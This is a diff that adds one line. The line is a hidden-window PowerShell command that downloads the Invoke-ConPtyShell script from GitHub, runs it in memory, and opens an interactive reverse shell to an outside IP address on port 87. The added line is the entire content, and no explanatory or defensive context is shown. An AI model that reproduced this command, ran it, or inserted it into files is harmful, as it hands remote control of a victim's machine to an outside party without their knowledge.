@@ -1,0 +1,1 @@
+PowerShell.exe -WindowStyle hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 88.80.188.30 87}
